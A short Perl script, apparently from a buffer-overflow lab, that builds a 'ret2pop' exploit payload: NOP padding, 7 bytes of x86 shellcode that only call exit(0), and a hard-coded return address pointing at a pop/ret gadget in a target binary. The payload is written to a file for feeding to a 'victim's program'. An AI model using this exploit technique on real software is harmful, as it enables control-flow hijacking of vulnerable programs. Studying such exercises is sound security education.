#!/usr/bin/perl
 
# shellcode for exit(0)
#
 
# NOTE: "." is a perl way to cat two strings (NOT part of shellcode)
# This shellcode takes 7 bytes

my $shellcode =
 "\x31\xc0".         # xorl      %eax, %eax
 "\x31\xdb".	     # xorl      %ebx, %ebx
 "\x40".             # inc %eax
 "\xcd\x80"          # int          $0x80
;

# This address must match the address of the pop and ret instruction sequence
# 80484d8:	5d                   	pop    %ebp
# 80484d9:	c3                   	ret    

my $retaddr = "\xd8\x84\x04\x08"; 
 
# Fill NOP instruction
my $pad = "\x90" x 9; # 9 times because I need 16 bytes to hit the return address. 9+7 = 16.

# Input string to our victim's program
my $arg = $pad.$shellcode.$retaddr;
 
# Let us store the input string to a file
open OUT, "> payload_ret2pop";
print OUT $arg;
close OUT;
